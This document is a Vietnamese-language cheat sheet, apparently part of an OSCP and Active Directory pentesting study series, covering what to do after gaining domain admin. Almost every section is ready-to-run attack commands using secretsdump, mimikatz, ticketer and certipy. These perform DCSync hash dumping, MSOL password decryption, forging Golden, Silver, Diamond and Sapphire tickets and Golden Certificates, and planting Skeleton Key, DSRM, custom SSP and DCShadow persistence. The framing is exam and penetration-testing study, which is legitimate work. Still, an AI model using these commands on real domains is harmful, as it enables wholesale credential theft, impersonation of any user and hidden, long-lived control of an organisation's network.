# 12 — Domain admin: DCSync & Persistence

**Trạng thái:** tương đương Domain Admin / có quyền replication / truy cập DC.
**Mục tiêu:** lấy toàn bộ bí mật domain (`krbtgt`) và tạo persistence. Cột phải
cùng "Domain admin" của mindmap.

> Trong thi OSCP: khi đã DA, lấy `proof.txt` trên DC là đủ; persistence chủ yếu
> để hiểu và cho pentest thật.

---

## A. DCSync

> **Khi nào:** DA, hoặc có DS-Replication-Get-Changes(-All).
> **Tại sao:** giả làm DC yêu cầu replicate secret → lấy hash bất kỳ user.

```bash
secretsdump.py '<domain>/<user>:<password>'@'<domain_controller>'    # toàn bộ
nxc smb <dc_ip> -u <user> -p <password> -d <domain> --ntds
```

```powershell
mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt
mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator
```

- **Kết quả:** hash `krbtgt` (cho Golden ticket) + `Administrator` → PtH DC.

### Intra ID / Azure AD Connect (MSOL) — box "Hybrid"

> **Khi nào:** có tài khoản trên server Azure AD Connect.
> **Tại sao:** giải mã mật khẩu cleartext của tài khoản **MSOL_** (thường có quyền DCSync).

```bash
nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users | grep -i MSOL   # tìm MSOL
nxc smb <ip> -u <user> -p <password> -M msol                                     # dump MSOL
azuread_decrypt_msol_v2.ps1                                                       # giải mã trên AADConnect server
# → có MSOL creds → DCSYNC
```

---

## B. Golden Ticket

> **Khi nào:** có hash/AES của `krbtgt` + domain SID.
> **Tại sao:** tự ký TGT cho user bất kỳ, nhóm bất kỳ (DA) — persistence mạnh.

```bash
# lấy SID
lookupsid.py -domain-sids '<domain>/<user>:<password>'@<dc> 0
ticketer.py -nthash <HASH_KRBTGT> -domain-sid <domain_sid> -domain <domain> <anyuser>
ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>
```

```powershell
mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid> /krbtgt:<HASH_KRBTGT> /ptt"
mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid> /aes256:<krbtgt_aes256> /ptt"
```

---

## C. Silver Ticket

> **Khi nào:** có hash tài khoản **service** hoặc **máy**.
> **Tại sao:** tự ký TGS cho một service cụ thể, không chạm DC (kín hơn Golden).

```bash
ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>
```

```powershell
mimikatz "kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"
```

---

## D. Diamond / Sapphire Ticket

> **Khi nào:** có krbtgt key; muốn ticket **khó phát hiện** hơn Golden (sửa TGT
> thật thay vì tạo mới).

```bash
# Diamond
ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> \
   -aesKey <aeskey> -domain-sid <domain_sid> -user-id <user_id> -groups '512,513,518,519,520' <anyuser>
# Sapphire
ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password> \
   -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> 'ignored'
```

---

## E. Skeleton Key

> **Khi nào:** admin trên DC; chấp nhận persistence chỉ tồn tại trong RAM (mất khi reboot).
> **Tại sao:** thêm mật khẩu phụ `mimikatz` cho **mọi** user.

```powershell
mimikatz "privilege::debug" "misc::skeleton" "exit"     # password phụ = "mimikatz"
```

---

## F. DSRM

> **Khi nào:** admin trên DC.
> **Tại sao:** dùng hash DSRM admin local của DC để đăng nhập DC (persistence).

```powershell
# Bật dùng DSRM qua mạng:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
# rồi PtH với hash DSRM (lấy từ lsadump::sam trên DC)
```

---

## G. Custom SSP

> **Tại sao:** nạp SSP độc → ghi mật khẩu cleartext mọi lần đăng nhập vào log.

```powershell
mimikatz "privilege::debug" "misc::memssp" "exit"
# log: C:\Windows\System32\kiwissp.log
```

---

## H. DCShadow

> **Tại sao:** đăng ký một "DC giả" để đẩy thay đổi (ví dụ thêm SID History) mà né
> log replication thông thường.

```powershell
mimikatz lsadump::dcshadow ...        # cần 2 phiên (SYSTEM + DA)
```

---

## I. Golden Certificate

> **Khi nào:** có khoá riêng của CA (backup CA).
> **Tại sao:** tự ký chứng chỉ cho bất kỳ user → persistence cấp forest, không
> phụ thuộc mật khẩu/krbtgt.

```bash
certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>
certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>
certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>'
certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>
certipy auth -pfx <crt_file> -dc-ip <dc_ip>
```

---

## J. Sau khi DA — lan & lấy proof

```bash
secretsdump.py '<domain>/<user>:<password>'@<dc> -just-dc        # lưu toàn bộ hash
# PtH Administrator domain tới mọi máy chưa chiếm → lấy proof.txt
```

## Checklist Domain Admin / Persistence

- [ ] DCSync `krbtgt` + `Administrator` + `-just-dc`
- [ ] Azure AD Connect? → MSOL → DCSync
- [ ] (Persistence) Golden/Silver/Diamond/Sapphire ticket
- [ ] (Persistence) Skeleton/DSRM/Custom SSP/DCShadow/Golden cert
- [ ] Lan tới mọi máy + proof.txt
- [ ] Trust sang domain/forest khác → [file 13](13-trusts.md)
